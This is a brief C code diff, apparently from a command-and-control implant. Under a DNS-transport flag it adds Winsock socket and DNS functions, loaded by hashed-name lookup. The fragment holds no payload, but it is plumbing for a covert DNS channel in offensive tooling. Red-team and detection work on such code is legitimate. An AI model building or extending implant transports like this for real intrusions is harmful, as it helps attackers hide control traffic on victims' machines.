@@ -380,6 +380,14 @@ BOOL RtWs2_32(
         Instance->Win32.getaddrinfo     = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_GETADDRINFO );
         Instance->Win32.freeaddrinfo    = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_FREEADDRINFO );
 
+#ifdef TRANSPORT_DNS
+        Instance->Win32.socket          = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_SOCKET );
+        Instance->Win32.sendto          = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_SENDTO );
+        Instance->Win32.recvfrom        = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_RECVFROM );
+        Instance->Win32.select          = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_SELECT );
+        Instance->Win32.gethostbyname   = LdrFunctionAddr( Instance->Modules.Ws2_32, H_FUNC_GETHOSTBYNAME );
+#endif
+
         PUTS( "Loaded Ws2_32 functions" )
     } else {
         MemZero( ModuleName, sizeof( ModuleName ) );
